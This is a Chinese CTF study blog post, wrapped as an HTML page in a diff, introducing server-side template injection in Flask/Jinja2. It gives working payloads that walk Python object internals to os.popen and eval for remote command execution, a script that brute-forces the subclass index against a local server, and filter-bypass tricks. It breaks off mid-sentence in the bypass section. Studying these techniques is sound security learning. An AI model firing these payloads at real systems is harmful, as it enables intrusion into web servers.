@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>初学ssti - 你也喜欢小狸猫吗</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="初学ssti - 你也喜欢小狸猫吗" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="https://za0y0u.github.io/2023/10/25/ctf/%E5%88%9D%E5%AD%A6ssti/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-10-25T12:12:59.645Z" />
+  
+  <meta property="og:article:author" content="za0y0u" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="10"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/projects">Projects</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+
+        
+        <div class="date" id="date">
+            <span>October</span>
+            <span>25,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">初学ssti</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <!-- toc -->
+
+<ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB">漏洞分类</a></li>
+<li><a href="#%E4%B8%80%E4%BA%9B%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">一些魔术方法</a></li>
+<li><a href="#flask%E7%9A%84%E8%AF%AD%E5%8F%A5">Flask的语句</a></li>
+<li><a href="#%E8%BF%87%E6%BB%A4%E5%99%A8">过滤器</a></li>
+<li><a href="#ssti%E8%AF%AD%E5%8F%A5%E6%9E%84%E9%80%A0">SSTI语句构造</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87">绕过</a></li>
+</ul>
+<!-- tocstop -->
+
+<h2><span id="漏洞原理">漏洞原理</span></h2><p>SSTI是Server-Side Template Injection的缩写，是一种Web应用程序安全漏洞，主要存在于使用基于模板引擎的Web应用程序中。</p>
+<p>SSTI漏洞的主要原因是在Web应用程序中使用了基于模板引擎的渲染功能，并且没有正确地验证和过滤用户输入的数据。当攻击者能够构造特定的输入并成功地注入恶意代码时，模板引擎会将该代码当做合法的模板片段来处理，导致服务器端执行该代码。</p>
+<h2><span id="漏洞分类">漏洞分类</span></h2><h5><span id="条件语句注入">条件语句注入：</span></h5><p>攻击者在应用程序中的条件语句中注入模板代码，从而控制条件判断的分支，导致程序的逻辑错误。这种注入通常发生在基于条件语句的模板引擎，如 Django、Jinja2中。</p>
+<h5><span id="命令执行注入">命令执行注入：</span></h5><p>攻击者在应用程序中的命令执行语句中注入模板代码，从而执行任意系统命令，获取系统权限，对系统进行攻击等。这种注入通常发生在使用反序列化操作等动态执行代码的模板引擎中，如 FreeMarker、Velocity 等。</p>
+<h5><span id="变量渲染注入">变量渲染注入：</span></h5><p>攻击者在应用程序中的变量渲染语句中注入模板代码，从而影响页面的输出，导致代码执行或信息泄漏等问题。这种注入通常发生在基于语法标签的模板引擎，如 Smarty 等中。</p>
+<h5><span id="其他注入">其他注入：</span></h5><p>SSTI 漏洞还有一些其他的注入方式，如在 URL、请求头、Cookie 等参数中注入模板代码，通过多重注入实现攻击等。</p>
+<h2><span id="一些魔术方法">一些魔术方法</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__class__           查看对象所在的类</span><br><span class="line">__mro__             查看继承关系和调用顺序，返回元组</span><br><span class="line">__base__            返回基类</span><br><span class="line">__bases__           返回基类元组</span><br><span class="line">__subclasses__()    返回子类列表</span><br><span class="line">__init__            调用初始化函数，可以用来跳到__globals__</span><br><span class="line">__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典</span><br><span class="line">__builtins__        返回内建内建名称空间字典</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）		都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量</span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="flask的语句">Flask的语句</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;用于将表达式打印到模板输出</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``表示未包含在模板输出中的注释</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">##可以有和&#123;%%&#125;相同的效果（有环境条件）</span><br></pre></td></tr></table></figure>
+
+<h2><span id="过滤器">过滤器</span></h2><h6><span id="描述">描述：</span></h6><ol>
+<li>过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数</li>
+<li>可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器.</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">length():获取一个序列或者字典的长度并将其返回</span><br><span class="line"></span><br><span class="line">int()：将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()：将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">reverse()：反转字符串；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： 将value中的old替换为new</span><br><span class="line"></span><br><span class="line">list()：将变量转换为列表类型；</span><br><span class="line"></span><br><span class="line">string()：将变量转换成字符串类型；</span><br><span class="line"></span><br><span class="line">join()：将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用</span><br><span class="line"></span><br><span class="line">attr(): 获取对象的属性</span><br><span class="line">关于attr:</span><br><span class="line">官方解释：foo|attr(&quot;bar&quot;) 等效于 foo[&quot;bar&quot;] </span><br></pre></td></tr></table></figure>
+
+<h2><span id="ssti语句构造">SSTI语句构造</span></h2><p>1.用class拿到当前类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.拿到基类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br><span class="line">或</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">或</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[-1]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.拿到基类的子类，用<code>__subclasses__()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大多数利用的是<code>os._wrap_close</code>这个类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#用代码寻找对应下标</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;&#125;</span><br><span class="line">for i in range(500):</span><br><span class="line">    url = &quot;http://127.0.0.1:5000/?name=\</span><br><span class="line">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;</span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    #print(res.text)</span><br><span class="line">    if &#x27;os._wrap_close&#x27; in res.text:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<p>接下来就可以利用<code>os._wrap_close</code></p>
+<p>这个类中有<code>popen</code>方法，我们去调用它</p>
+<p>首先先调用它的__init__方法进行初始化类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以RCE了！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有一个比较厉害的模块，就是<code>__builtins__</code>,它里面有<code>eval()</code>等函数，我们可以也利用它来进行RCE</p>
+<p>payload如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="绕过">绕过</span></h2><h4><span id="绕过">绕过.</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、用[]代替.，举个例子</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;=&#123;&#123;&quot;&quot;[&#x27;__class__&#x27;]&#125;&#125;</span><br><span class="line">2、用attr()过滤器绕过，举个例子</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;=&#123;&#123;&quot;&quot;|attr(&#x27;__class__&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="绕过_">绕过_</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、通过list获取字符列表，然后用pop来获取_，举个例子</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(24)%&#125;&#123;%print(a)%&#125;</span><br><span class="line">2、可以通过十六进制编码的方式进行绕过，举个例子</span><br><span class="line">&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;]&#125;&#125; =&#123;&#123;().__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="绕过">绕过[]</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__bases__[0]=__bases__.__getitem__(0)</span><br></pre></td></tr></table></figure>
+
+<h4><span id="绕过花括号">绕过花括号</span></h4><p>有时候为了防止SSTI，可能程序员会ban掉</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by za0y0u, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        <a class="next"></a>
+        
+        <a href="/2023/10/21/ctf/RSA%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">rsa思路总结</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/projects" class="item">Projects</a>
+                
+                <a href="/resume" class="item">Resume</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 za0y0u<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
